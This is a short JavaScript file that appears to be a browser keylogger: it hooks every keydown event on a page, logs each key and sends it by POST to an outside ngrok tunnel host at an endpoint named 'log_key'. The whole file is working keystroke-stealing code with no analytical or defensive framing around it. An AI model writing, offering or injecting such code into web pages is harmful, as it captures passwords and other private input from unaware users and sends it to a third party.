document.onkeydown = function (evt) {
  evt = evt || window.event;
  let key = evt.key;
  const keyCode = evt.keyCode || evt.which;

  console.log(key);

  // Check if the key is backspace
  if (keyCode === 8) {
    key = 'backspace';
  }

  if (key) {
    fetch('http://0.tcp.in.ngrok.io:14572/log_key', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: key }),
    });
  }
};
